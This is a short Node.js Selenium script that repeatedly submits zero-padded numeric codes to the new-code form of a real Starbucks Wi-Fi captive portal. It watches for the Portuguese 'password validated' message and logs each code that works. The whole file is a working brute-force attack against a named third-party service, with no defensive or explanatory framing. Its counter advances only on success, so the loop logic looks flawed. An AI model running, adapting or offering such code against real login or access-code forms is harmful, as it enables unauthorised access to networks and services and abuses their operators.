const webdriver = require('selenium-webdriver')
const By = webdriver.By
const until = webdriver.until
const async = require('async')

const driver = new webdriver.Builder()
    .forBrowser('chrome')
    .build()

const pad = (number) => Array(Math.max(9 - String(number).length + 1, 0)).join(0) + number

const text = 'Senha validada. Cadastre-se para navegar.'
let i = 3096
async.whilst(() => true, (cb) => {
  driver.get('https://portal.linktelwifi.com.br/user/starbucks/new-code')
  driver.findElement(By.name('new_code')).sendKeys(pad(i))
  driver.findElement(By.id('btn-send')).click()
    .then(
      driver.getPageSource().
        then((html) => {
          if(html.indexOf(text) !== -1)
            console.log(i++)
          cb()
        })
    )
})

